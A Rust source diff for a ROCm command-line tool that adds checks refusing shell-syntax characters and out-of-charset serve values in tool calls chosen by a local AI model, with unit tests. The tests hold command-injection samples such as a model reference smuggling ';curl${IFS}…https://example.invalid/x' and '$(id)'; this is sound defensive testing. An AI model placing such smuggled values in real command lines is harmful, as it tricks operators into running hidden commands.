@@ -29,7 +29,7 @@ use crate::rocm_argv::{
 };
 use crate::service_launch::is_loopback_host;
 use crate::services_text::validate_service_id;
-use crate::shell_quote::has_terminal_control_character;
+use crate::shell_quote::{has_terminal_control_character, paste_unsafe_character};
 use crate::{providers, therock};
 use anyhow::{Context, Result, bail};
 use rocm_core::{DEFAULT_LOCAL_HOST, builtin_watcher, runtime_install_root_is_protected};
@@ -253,9 +253,9 @@ const CHAT_TOOLS_SCREENING_THEIR_OWN_ARGUMENTS: [&str; 1] = ["rocm_command"];
 /// a *shell*, not to a terminal.
 ///
 /// Scope note, so the guarantee is not overread: this covers model-supplied
-/// *arguments*, not model-supplied prose. An assistant's reply text is still
-/// printed as it comes; `strip_ansi_sequences` in `comfyui.rs` is the tool for
-/// that surface, and is already used on ComfyUI log output.
+/// *arguments*, which are refused. Model-supplied *prose* — the reply, tool
+/// results, an error quoting either — cannot be refused, so `rocm chat` cleans
+/// it instead, with [`rocm_core::terminal::sanitize_terminal_text`].
 ///
 /// Walks the whole arguments object rather than naming fields, so a new
 /// argument on one of these tools inherits the guarantee instead of having to
@@ -294,6 +294,216 @@ fn reject_control_characters(tool: &str, arguments: &serde_json::Value) -> Resul
             .try_for_each(|value| reject_control_characters(tool, value)),
         _ => Ok(()),
     }
+}
+
+/// The tools whose arguments become a command line the operator is shown and
+/// may paste: the approval card, the `advanced manual command:` line, and for
+/// `install_sdk_dry_run` the dry run's `command: uv …` line. `rocm_command`
+/// is handled on its own, through its normalized argv.
+const CHAT_TOOLS_RENDERED_AS_COMMANDS: [&str; 7] = [
+    "install_sdk",
+    "install_sdk_dry_run",
+    "install_engine",
+    "launch_server",
+    "stop_server",
+    "watcher_disable",
+    "watcher_enable",
+];
+
+/// The `launch_server` fields that become `rocm serve` values, held to
+/// [`is_model_requested_serve_token`].
+const LAUNCH_SERVER_SERVE_FIELDS: [&str; 5] = ["model", "engine", "device", "runtime_id", "env_id"];
+
+/// The checks a tool call gets when the *model* chose it, on top of
+/// [`validate_chat_tool_call`], which every call gets whoever made it.
+///
+/// Two rules, both about the command lines `rocm chat` and the dashboard print
+/// for the operator to approve or paste:
+///
+/// * no value may carry a [`paste_unsafe_character`], which a Windows shell
+///   reads as syntax however the line is quoted;
+/// * a model-requested `serve` names its model and option values only with
+///   [`is_model_requested_serve_token`] characters.
+///
+/// Not part of [`validate_chat_tool_call`] on purpose. That function also
+/// checks calls the CLI builds from what the user typed — an install folder
+/// named in the prompt, say — and a value the user typed is theirs to use. So
+/// the callers that receive a call from a model run this as well: the chat
+/// turn for the calls in the provider's reply, and the dashboard's tool
+/// executor. Run it after [`validate_chat_tool_call`], so a value carrying a
+/// control character is refused for that first and never echoed.
+pub(crate) fn validate_model_chosen_tool_call(call: &providers::ChatToolCall) -> Result<()> {
+    if call.name == "rocm_command" {
+        let args = normalized_chat_rocm_command_args(call)?;
+        return validate_model_chosen_argv(&args, "local assistant");
+    }
+    if !CHAT_TOOLS_RENDERED_AS_COMMANDS.contains(&call.name.as_str()) {
+        return Ok(());
+    }
+    // The dry run previews `rocm install sdk`, and has no argv of its own.
+    let command = if call.name == "install_sdk_dry_run" {
+        "rocm install sdk".to_owned()
+    } else {
+        rocm_chat_tool_requested_args(call)
+            .map_or_else(|| "rocm".to_owned(), |args| command_head(&args))
+    };
+    reject_unpasteable_values(&command, None, &call.arguments)?;
+    if call.name == "launch_server"
+        && let Some(object) = call.arguments.as_object()
+    {
+        for field in LAUNCH_SERVER_SERVE_FIELDS {
+            if let Some(value) = object.get(field).and_then(serde_json::Value::as_str) {
+                validate_model_requested_serve_token("local assistant", field, value)?;
+            }
+        }
+    }
+    Ok(())
+}
+
+/// [`validate_model_chosen_tool_call`]'s two rules for a whole `rocm` argv
+/// (without the program name), for `rocm_command` and for the provider planner,
+/// whose argv lands in the `request plan` block. `actor` opens each refusal.
+pub(crate) fn validate_model_chosen_argv(args: &[String], actor: &str) -> Result<()> {
+    let command = command_head(args);
+    for arg in args {
+        reject_unpasteable_value(actor, &command, "argument", arg)?;
+    }
+    if args
+        .first()
+        .is_some_and(|first| first.eq_ignore_ascii_case("serve"))
+    {
+        validate_model_requested_serve_values(args, actor)?;
+    }
+    Ok(())
+}
+
+/// `rocm` plus the subcommand words at the head of `args`, for naming the
+/// command a refused value belongs to: `rocm install sdk`, `rocm serve`. Only
+/// plain lowercase words qualify, so nothing the model chose beyond a
+/// subcommand name is ever echoed by it.
+fn command_head(args: &[String]) -> String {
+    let words = if args.first().is_some_and(|first| first == "serve") {
+        1
+    } else {
+        2
+    };
+    let mut head = vec!["rocm"];
+    head.extend(
+        args.iter()
+            .take(words)
+            .take_while(|arg| {
+                !arg.is_empty()
+                    && arg
+                        .chars()
+                        .all(|character| character.is_ascii_lowercase() || character == '-')
+                    && !arg.starts_with('-')
+            })
+            .map(String::as_str),
+    );
+    head.join(" ")
+}
+
+fn reject_unpasteable_values(
+    command: &str,
+    field: Option<&str>,
+    arguments: &serde_json::Value,
+) -> Result<()> {
+    match arguments {
+        serde_json::Value::String(value) => {
+            let what = field.map_or_else(|| "a value".to_owned(), |field| format!("`{field}`"));
+            reject_unpasteable_value("local assistant", command, &what, value)
+        }
+        serde_json::Value::Array(values) => values
+            .iter()
+            .try_for_each(|value| reject_unpasteable_values(command, field, value)),
+        serde_json::Value::Object(entries) => entries
+            .iter()
+            .try_for_each(|(key, value)| reject_unpasteable_values(command, Some(key), value)),
+        _ => Ok(()),
+    }
+}
+
+/// Refuse `value` if it holds a [`paste_unsafe_character`]. The message names
+/// the character and the command, never the whole line: printing the line is
+/// what the refusal exists to avoid. The value and the character are shown
+/// escaped to ASCII (`escape_default`), so a typographic quote reaches a
+/// console on any code page as `\u{2019}` rather than as mojibake; the value
+/// has already passed the control-character check.
+fn reject_unpasteable_value(actor: &str, command: &str, what: &str, value: &str) -> Result<()> {
+    if let Some(character) = paste_unsafe_character(value) {
+        let value = value.escape_default();
+        let character = character.escape_default();
+        bail!(
+            "{actor} chose {what} \"{value}\" for `{command}`, and its '{character}' is not safe on a \
+             command line meant to be pasted: a Windows shell reads it as syntax (PowerShell a \
+             single quote, cmd.exe any of & | < > ^ % \" !). Nothing was run. If you meant that \
+             value, supply it yourself by running `{command}` with it"
+        );
+    }
+    Ok(())
+}
+
+/// The characters a model may use in a `rocm serve` model reference or option
+/// value it asks for: ASCII letters and digits and `. _ - / : @ + \`, at most
+/// 256 of them, not starting with `-`.
+///
+/// That covers model ids (`qwen2.5-7b-instruct`, `Qwen/Qwen2.5-7B-Instruct`),
+/// tags and quantisations (`qwen2.5:7b`, `repo:Q4_K_M`), revisions
+/// (`repo@main`) and local model files on Linux and Windows
+/// (`/models/a.gguf`, `C:\models\a.gguf`), and nothing a shell, a terminal or
+/// a second reading could take for anything but those. The `serve` line is the
+/// one a model is most likely to be asked for, and a model reference has no
+/// business carrying `;`, `$`, a quote or a space, so such a value is refused
+/// rather than quoted and left to the operator to read correctly. A model file
+/// whose path has a space in it can still be served by running `rocm serve`
+/// directly; `rocm serve` itself is not held to this.
+fn is_model_requested_serve_token(value: &str) -> bool {
+    !value.is_empty()
+        && value.len() <= 256
+        && !value.starts_with('-')
+        && value.chars().all(|character| {
+            character.is_ascii_alphanumeric()
+                || matches!(character, '.' | '_' | '-' | '/' | ':' | '@' | '+' | '\\')
+        })
+}
+
+fn validate_model_requested_serve_token(actor: &str, field: &str, value: &str) -> Result<()> {
+    if !is_model_requested_serve_token(value) {
+        let value = value.escape_default();
+        bail!(
+            "{actor} requested serve `{field}` \"{value}\"; only letters, digits and \
+             `. _ - / : @ + \\` are accepted, not starting with `-`. Nothing was run. To serve \
+             anything else, run `rocm serve` yourself"
+        );
+    }
+    Ok(())
+}
+
+/// Hold every value on a model-requested `serve` argv — the model reference and
+/// each option's value, attached (`--engine=vllm`) or not — to
+/// [`is_model_requested_serve_token`]. Flags themselves are left to clap and
+/// to [`validate_serve_command_safety`].
+fn validate_model_requested_serve_values(args: &[String], actor: &str) -> Result<()> {
+    for arg in args.iter().skip(1) {
+        let value = match arg.strip_prefix("--") {
+            Some(flag) => match flag.split_once('=') {
+                Some((name, value)) => {
+                    if !name
+                        .chars()
+                        .all(|character| character.is_ascii_alphanumeric() || character == '-')
+                    {
+                        bail!("{actor} requested a malformed serve option {arg:?}");
+                    }
+                    value
+                }
+                None => continue,
+            },
+            None if arg.starts_with('-') => continue,
+            None => arg.as_str(),
+        };
+        validate_model_requested_serve_token(actor, "argument", value)?;
+    }
+    Ok(())
 }
 
 /// Validate a `proposal_action` chat-tool call: `proposal_id` must be a
@@ -2830,5 +3040,186 @@ mod tests {
             validate_chat_rocm_command_safety(&owned_argv(&[word, "qwen", "--managed"]))
                 .expect("a managed serve passes in any case");
         }
+    }
+
+    fn install_sdk_call(name: &str, prefix: &str) -> providers::ChatToolCall {
+        providers::ChatToolCall {
+            id: None,
+            name: name.to_owned(),
+            arguments: serde_json::json!({
+                "channel": "release",
+                "format": "wheel",
+                "prefix": prefix,
+            }),
+        }
+    }
+
+    /// Every character a Windows shell reads as syntax inside a POSIX
+    /// single-quoted word, in a value the model chose, is refused on every
+    /// surface a model can put an argv on — and the refusal tells the user to
+    /// supply the value themselves. The same value from the user passes.
+    #[test]
+    fn a_model_chosen_value_a_windows_shell_would_read_as_syntax_is_refused() {
+        for character in [
+            '\'', '\u{2018}', '\u{2019}', '\u{201a}', '\u{201b}', '&', '|', '<', '>', '^', '%',
+            '"', '!',
+        ] {
+            let prefix = format!("/mnt/data/rocm{character}x");
+            for tool in ["install_sdk", "install_sdk_dry_run"] {
+                let call = install_sdk_call(tool, &prefix);
+                // Not a structural problem: the user may use this folder.
+                validate_chat_tool_call(&call)
+                    .unwrap_or_else(|error| panic!("{tool} {prefix:?}: {error:#}"));
+                let error = validate_model_chosen_tool_call(&call)
+                    .expect_err(&format!("{tool} accepted a model-chosen {prefix:?}"))
+                    .to_string();
+                assert!(
+                    error.contains(&format!("'{}'", character.escape_default()))
+                        && error.is_ascii()
+                        && error.contains(
+                            "If you meant that value, supply it yourself by running \
+                             `rocm install sdk` with it"
+                        ),
+                    "{tool}: {error}"
+                );
+            }
+            let call = rocm_command_call(&["install", "sdk", "--prefix", &prefix]);
+            validate_chat_tool_call(&call).expect("structurally valid");
+            let error = validate_model_chosen_tool_call(&call)
+                .expect_err(&format!("rocm_command accepted {prefix:?}"))
+                .to_string();
+            assert!(error.contains("`rocm install sdk`"), "{error}");
+        }
+    }
+
+    /// The rest of what a POSIX shell treats specially is inert inside single
+    /// quotes in POSIX shells and PowerShell and starts nothing in `cmd.exe`,
+    /// so it is still accepted from the model, and quoted.
+    #[test]
+    fn other_shell_special_characters_in_a_model_chosen_value_are_still_quoted() {
+        let call = install_sdk_call("install_sdk", "/mnt/data/a;b $(c) `d` e");
+        validate_chat_tool_call(&call).expect("valid");
+        validate_model_chosen_tool_call(&call).expect("nothing here is live in a Windows shell");
+        let request = chat_tool_approval_request(&call, None).expect("accepted");
+        assert!(
+            request
+                .display_command
+                .as_deref()
+                .is_some_and(|line| line.contains("--prefix '/mnt/data/a;b $(c) `d` e'")),
+            "{:?}",
+            request.display_command
+        );
+    }
+
+    /// Tools whose arguments are never rendered into a command line keep
+    /// accepting the characters: `path_exists` only probes a path.
+    #[test]
+    fn a_probe_path_may_hold_an_apostrophe() {
+        let probe = providers::ChatToolCall {
+            id: None,
+            name: "path_exists".to_owned(),
+            arguments: serde_json::json!({ "path": "/home/o'brien & co" }),
+        };
+        validate_chat_tool_call(&probe).expect("valid");
+        validate_model_chosen_tool_call(&probe).expect("nothing is rendered to paste");
+    }
+
+    /// A model reference built to run a second command when the printed `serve`
+    /// line is pasted. `${IFS}` rather than spaces, so a check that looked only
+    /// for whitespace leaves it whole.
+    const SERVE_INJECTION_MODEL: &str = "qwen;curl${IFS}-s${IFS}https://example.invalid/x";
+
+    fn launch_server_call(model: &str) -> providers::ChatToolCall {
+        providers::ChatToolCall {
+            id: None,
+            name: "launch_server".to_owned(),
+            arguments: serde_json::json!({ "model": model, "host": "127.0.0.1" }),
+        }
+    }
+
+    #[test]
+    fn a_model_requested_serve_reference_outside_the_charset_is_refused() {
+        for model in [
+            SERVE_INJECTION_MODEL,
+            "qwen$(id)",
+            "qwen`id`",
+            "my model",
+            "--allow-public-bind",
+            "qwen=x",
+        ] {
+            let error = validate_model_chosen_tool_call(&launch_server_call(model))
+                .expect_err(&format!("launch_server accepted {model:?}"))
+                .to_string();
+            assert!(
+                error.contains("only letters, digits")
+                    && error.contains("run `rocm serve` yourself"),
+                "{model:?}: {error}"
+            );
+        }
+        // The generic tool reaches `serve` too, and is held to the same rule,
+        // attached option values included.
+        for args in [
+            vec!["serve", SERVE_INJECTION_MODEL, "--managed"],
+            vec!["serve", "qwen", "--managed", "--engine=vllm;id"],
+            vec!["serve", "qwen", "--managed", "--runtime-id", "a b"],
+        ] {
+            let error = validate_model_chosen_tool_call(&rocm_command_call(&args))
+                .expect_err(&format!("{args:?}"))
+                .to_string();
+            assert!(error.contains("only letters, digits"), "{args:?}: {error}");
+        }
+    }
+
+    #[test]
+    fn ordinary_model_references_are_still_servable() {
+        for model in [
+            "qwen",
+            "qwen2.5-7b-instruct",
+            "Qwen/Qwen2.5-7B-Instruct",
+            "qwen2.5:7b",
+            "unsloth/Qwen3-4B-GGUF:Q4_K_M",
+            "repo@main",
+            "/models/a.gguf",
+            "C:\\models\\a.gguf",
+        ] {
+            let call = launch_server_call(model);
+            validate_chat_tool_call(&call).expect("valid");
+            validate_model_chosen_tool_call(&call)
+                .unwrap_or_else(|error| panic!("{model:?} must be servable: {error:#}"));
+        }
+        let call = rocm_command_call(&[
+            "serve",
+            "Qwen/Qwen2.5-7B-Instruct",
+            "--managed",
+            "--engine",
+            "vllm",
+            "--port",
+            "8001",
+            "--host=127.0.0.1",
+        ]);
+        validate_model_chosen_tool_call(&call).expect("an ordinary serve line is accepted");
+    }
+
+    #[test]
+    fn a_refusal_names_only_the_subcommand_never_a_model_value() {
+        use crate::test_support::owned_argv;
+
+        assert_eq!(
+            command_head(&owned_argv(&["install", "sdk", "--prefix", "x"])),
+            "rocm install sdk"
+        );
+        assert_eq!(
+            command_head(&owned_argv(&["serve", "qwen", "--managed"])),
+            "rocm serve"
+        );
+        assert_eq!(
+            command_head(&owned_argv(&["engines", "install", "vllm"])),
+            "rocm engines install"
+        );
+        assert_eq!(
+            command_head(&owned_argv(&["update", "--apply"])),
+            "rocm update"
+        );
+        assert_eq!(command_head(&owned_argv(&["x&y", "sdk"])), "rocm");
     }
 }
